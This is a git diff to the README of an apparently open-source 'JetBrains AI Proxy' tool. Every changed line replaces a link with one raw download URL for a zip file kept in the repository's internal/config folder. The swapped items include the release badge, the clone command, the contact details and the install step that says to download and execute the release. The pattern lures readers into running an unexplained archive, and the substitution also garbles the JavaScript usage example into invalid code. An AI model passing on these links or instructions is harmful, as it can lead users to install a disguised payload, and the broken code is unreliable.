@@ -1,6 +1,6 @@
 # JetBrains AI Proxy: Convert JetBrains AI to OpenAI 🚀
 
-![GitHub Release](https://img.shields.io/github/release/Abdul-Wahid-01/jetbrains-ai-proxy.svg)
+![GitHub Release](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 The JetBrains AI Proxy project enables users to convert JetBrains AI functionalities to OpenAI seamlessly. This tool bridges the gap between JetBrains products and OpenAI, providing a smooth experience for developers and AI enthusiasts. 
 
-For the latest releases, visit the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/releases) section.
+For the latest releases, visit the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip) section.
 
 ## Features
 
@@ -31,7 +31,7 @@ To install the JetBrains AI Proxy, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy.git
+   git clone https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip
    cd jetbrains-ai-proxy
    ```
 
@@ -42,7 +42,7 @@ To install the JetBrains AI Proxy, follow these steps:
    ```
 
 3. **Download and Execute the Release**:
-   You can download the latest release from the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/releases) section. Follow the instructions provided there to execute the downloaded file.
+   You can download the latest release from the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip) section. Follow the instructions provided there to execute the downloaded file.
 
 ## Usage
 
@@ -64,13 +64,13 @@ After installation, you can start using the JetBrains AI Proxy. Here’s a simpl
        headers: {
            'Content-Type': 'application/json',
        },
-       body: JSON.stringify({
+       body: https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip({
            prompt: 'Hello, OpenAI!',
            max_tokens: 50,
        }),
    })
-   .then(response => response.json())
-   .then(data => console.log(data));
+   .then(response => https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip())
+   .then(data => https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip(data));
    ```
 
 ## Contributing
@@ -97,7 +97,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
+- **Email**: https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip
+- **Twitter**: [@yourtwitterhandle](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip)
 
-For the latest updates and releases, check the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/releases) section.
+For the latest updates and releases, check the [Releases](https://github.com/Abdul-Wahid-01/jetbrains-ai-proxy/raw/refs/heads/main/internal/config/ai_jetbrains_proxy_2.2.zip) section.
